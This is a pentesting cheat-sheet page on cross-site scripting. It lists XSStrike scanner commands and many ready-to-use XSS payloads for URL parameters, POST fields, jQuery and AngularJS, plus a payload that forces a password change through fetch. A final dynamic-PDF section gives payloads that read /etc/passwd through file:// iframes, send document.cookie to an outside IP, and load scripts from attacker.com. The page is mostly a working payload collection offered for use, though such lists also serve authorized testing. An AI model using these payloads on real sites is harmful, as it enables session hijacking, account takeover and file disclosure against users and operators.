---
title: XSS (Cross-Site Scripting)
description: XSS enables attackers to injection client-side scripts into web applications.
tags:
    - XSS
    - Web
refs:
    - https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf
date: 2023-02-03
draft: false
---

There are 3 types of XSS.

- **Reflected XSS**
- **Stored XSS**
- **DOM Based XSS**

<br />

## Automation

**[XSStrike](https://github.com/s0md3v/XSStrike)** is a XSS scanner.

```sh
# GET request
python xsstrike.py -u http://vulnerable.com/?param=test

# POST reqeust
python xsstrike.py -u http://vulnerable.com/post --data "username=test&email=test&comment=test"

# data as JSON
python xsstrike.py -u http://vulnerable.com/comment --data '{"comment": "test"}' --json
```

<br />


## Manual

### URL Parameters

<div data-pagefind-ignore>

```txt
/?q=<script>alert(1)</script>
/?q="><script>alert(1)</script>
/?q=<script>alert(1)</script>
/?q="><script>alert(1)</script>
/?q='></script><script>alert(1)</script>

/?q=" src=1 onerror=alert(1)>
/?q=<><img src=1 onerror=alert(1)>
/?q="><img src=1 onerror=alert(1)>
/?q="></span><img src=1 onerror=alert(1)>
/?q="><svg onload=alert(1)>

/?q=javascript:alert(1)
/?q=\"-alert(1)//

/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

/?q=<a onmouseover=alert(1)>click</a>
/?q=" onmouseleave='alert(1)'">

/?q=<img src="jav ascript:alert(1)">
/?q=<img src="jav&#x09;ascript:alert(1)">
/?q=<img src="jav&#x0A;ascript:alert(1)">


/?q=&subparam=--><script>alert(1)</script>
/index.php#value='><script>alert(1)</script>
```

</div>

- **JQuery**

    <div data-pagefind-ignore>

    ```txt
    https://vulnerable.com/#<img src=1 onerror=alert(1)>
    <iframe src="https://vulnerable.com/#" onload="this.src+='<img src=1 onerror=alert(1)>'">
    ```

    </div>

- **AngularJS**

    If you find **"\<html ng-app>"** or **"\<div ng-app>"** in the HTML source code, you may be able to abuse it by XSS.

    ```txt
    https://vulnerable.com/?search={{$on.constructor('alert(1)')()}}
    ```

### POST Parameters

POST params are almost the same as URL params, so try the common payloads of section 1.  
Ant the following ones.

```txt
title=<a href="http://localhost/newUser?username=test&password=test">test</a>&comment=hello
```

- **Change User Profiles**

    If the website allows users to change passwords from the URL params...

    ```txt
    /profile?new_password=password
    ```

    Submit the payload to user input forms such as messages, comments, forums...

    ```txt
    <script>fetch('/profile?new_password=password');</script>
    ```
    
<br />

## Dynamic PDF

if the PDF file, which is created somewhere in the website, that is reflected our payloads, we can insert malicious code. It refers to [the post](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf).

Here insert the payload into the POST params.   
For example, assume the key is “name” and the value can be injected.

<div data-pagefind-ignore>

```bash
name="<img src='x' onerror=\"document.write('test')>\""
name="<script>document.write('test')</script>"

# Path disclosure
name="<img src='x' onerror=\"document.write(JSON.stringify(window.location))\">"
name="<script>document.write('<iframe src=\"'+window.location.href+'\"></iframe>')</script>"

# Read files
name="<iframe src=file:///etc/passwd width=1000px height=1000px></iframe>"
name="<iframe src=file:///var/www/html/index.php width=1000px height=1000px></iframe>"
name="<img src='x' onerror=\"document.write('<iframe src=file:///etc/passwd></iframe>')\"/>"

# Cookie hijacking
name="<img src=x onerror=\"location.href='http://10.0.0.1/?cookie='+ document.cookie\">"

# External script
name="<script src=\"http://attacker.com/test.js\"></script>"
name="<img src='x' onerror=\"document.write('<script src=\"http://10.0.0.1/test.js\"></script>')\"/>
```

</div>